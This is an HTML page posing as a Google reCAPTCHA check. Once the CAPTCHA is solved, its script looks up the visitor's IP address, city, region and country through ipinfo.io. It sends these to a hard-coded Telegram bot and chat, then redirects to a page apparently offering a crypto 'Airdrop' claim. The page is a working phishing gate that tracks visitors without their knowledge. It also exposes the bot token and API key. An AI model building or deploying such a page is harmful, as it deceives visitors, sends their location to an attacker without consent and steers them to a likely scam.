<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google reCAPTCHA Verification</title>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        button {
            padding: 10px 20px;
            border: none;
            background: #007bff;
            color: white;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Please verify you are human</h2>
        <form id="captcha-form" action="#" onsubmit="return validateCaptcha(event)">
            <div class="g-recaptcha" data-sitekey="6Lfx4fIqAAAAANwcDYQ4W-ANlGaJOYc3GnogHXva"></div>
            <br>
            <button type="submit">Verify</button>
        </form>
    </div>

    <script>
        async function validateCaptcha(event) {
            event.preventDefault();
            var response = grecaptcha.getResponse();
            if (response.length === 0) {
                alert("Please complete the CAPTCHA!");
                return;
            }

            try {
                // Get IP and location info
               const res = await fetch("https://ipinfo.io/json?token=614f4f5fe09129");
                const data = await res.json();
                
                const ip = data.ip || "N/A";
                const city = data.city || "N/A";
                const region = data.region || "N/A";
                const country = data.country || "N/A";


                const message = `‚úÖ CAPTCHA Passed\nüåç IP: ${ip}\nüìç Location: ${city}, ${region}, ${country}`;
                
                const telegramBotToken = "7856802659:AAFxMtbOsVBuU-lwy0T9WzYLFgVOPFAY5uY";
                const chatId = "-4799661248";

                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                // Redirect after sending the message
                window.location.href = "https://parti-claim.netsons.org/Airdrop/";

            } catch (error) {
                console.error("Error sending data to Telegram:", error);
                alert("Something went wrong. Try again later.");
            }
        }
    </script>

</body>
</html>
